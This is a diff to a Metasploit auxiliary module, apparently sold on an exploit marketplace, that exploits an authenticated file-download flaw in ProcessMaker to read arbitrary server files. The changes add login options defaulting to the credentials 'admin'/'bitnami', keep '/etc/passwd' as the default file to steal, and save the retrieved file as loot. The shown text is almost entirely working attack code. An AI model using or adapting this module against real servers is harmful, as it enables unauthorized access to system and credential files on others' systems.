@@ -17,13 +17,14 @@ class MetasploitModule < Msf::Auxiliary
     This module exploits an authenticated file download vulnerability
     in ProcessMaker.
 
-    ProcessMaker is a popular enterprise software tool to enable businesses to manage defined processes for business tasks and workflows. Privileged access to a ProcessMaker instance may yield significant insight into internal processes, key stakeholders, and high value targets on the network. Tested against version 3.1.
+    ProcessMaker is a popular enterprise software tool to enable businesses to manage defined processes for business tasks and workflows.
+    Privileged access to a ProcessMaker instance may yield significant insight into internal processes, key stakeholders, and high value targets on the network. Fixed in version 3.2.1.
 
     Categories: Open Source, Enterprise
 
-    Price: 4
+    Price: 3
 
-    Video: none
+    Video: https://asciinema.org/a/B5jqrYal9pOaJOJIvlE0od87l
 
     OS: Multi
 
@@ -45,7 +46,9 @@ class MetasploitModule < Msf::Auxiliary
       [
         OptString.new("TARGETURI", [true, 'The relative URI of ProcessMaker', '/']),
         OptString.new('PM_WORKSPACE', [true, 'The ProcessMaker workspace to use', 'workflow']),
-        OptString.new('FILEPATH', [true, 'The file path on the server to read', '/etc/passwd'])
+        OptString.new('FILEPATH', [true, 'The file path on the server to read', '/etc/passwd']),
+        OptString.new('USERNAME', [true, 'The username to authenticate with', 'admin']),
+        OptString.new('PASSWORD', [true, 'The password to authenticate with', 'bitnami'])
       ], self.class)
   end
 
@@ -91,6 +94,9 @@ class MetasploitModule < Msf::Auxiliary
       'cookie' => cookie
     })
 
+    path = store_loot("processmaker.file", "text/plain", datastore['RHOST'], res.body, datastore['FILEPATH'])
+
+    print_good('File saved to: ' + path)
   end
 end
 
